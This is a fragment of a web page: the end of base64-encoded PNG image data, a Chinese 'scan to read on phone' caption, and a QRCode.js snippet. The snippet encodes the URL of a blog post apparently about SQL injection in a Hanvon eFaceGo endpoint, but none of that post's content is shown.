+VRINuGoFuFkZ/p+s7tqA+Z2/3OzXcd0g8PnGXthWR7DqL3nHyW77pchHGuep9b+vUJ8am8CW6+y6otraufE7JtCJqFcAj2vllOfZZXh/25+oV9FqQHgpWp6rnOK7OuM3+d3bvu/TCeZ91zfULWT+MNrjcLgWwPgp7RLYvqMObUO0Jyvd+cugjJP+ubK4T9Xhh1CIdg9e4V7Pv9rJAcHGO/Bzzym4X08MV/9wlsvsvy9m5fLkK2KTfXEZKDoH7vg/jqMHL7IDoEza8RRs9eM3JITq4vPnSVESH9o/o8cz5kjrzw+oQ8/xx/Jbl8l1XbWdfs7utMXUO23PPlVXVdDvt9+h1rVpV6Xc/KDOQeEFS3r/Ou64swzoGR29/R/o7m1vr1CVk/jTe4Xr6GQLYNz+GzZ/ctgHGuuui8ziF9+h0hPtCthX91pn2iA+Wiuggc/puNMPevT4hP8U1wWYjbPsPZuWG+9epxbl1XwXP53le969IvXOt1XVpVXVfBeE8Ih2BlqqqnCqJDsLwqCIdgaeuq3qq1VtelVdV1FaQfHrgspAJXvf4JbBYCj23B4/rsqLX5Knj0wPa6MutyLozZrstFGPPw4GZEiCdf37+u1UVIvrwq9breK31IH4zYfbm4nrlZiKELX/MEvr0Qtwt5K/xtqM+4ekf7IPPkPSfXL+waZEbX5TOsWVWQ/rquMg/R5eVVyTuWV6Ve11XyNX57Ieth1/X3n8CPLQTyFtWbUAXhHhnCIViZKgjvOXlHSB4e/15Wz9TcKnV49MCjD6Kbq54qGHX9GVZP1cyH+bwfW8jsMJd+/AQ2C6nN7tXxmNvyHy8+y3Xfe0HeGrk5ORz7lYNkIOiMjpVdFySvBuEQtB+Ouf3mv4KbhXxlyNXz757AshDI9uEYZ7eG9M38Z98eyBzzsM9n99nTITNgxL3skeaZRLOQuXLRHMSX64sQH7j+/yG3N/u1fELe7Fz/t8f5HwAAAP//tjTrNwAAAAZJREFUAwBT2rPOXPBpCAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryAlarmEvent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 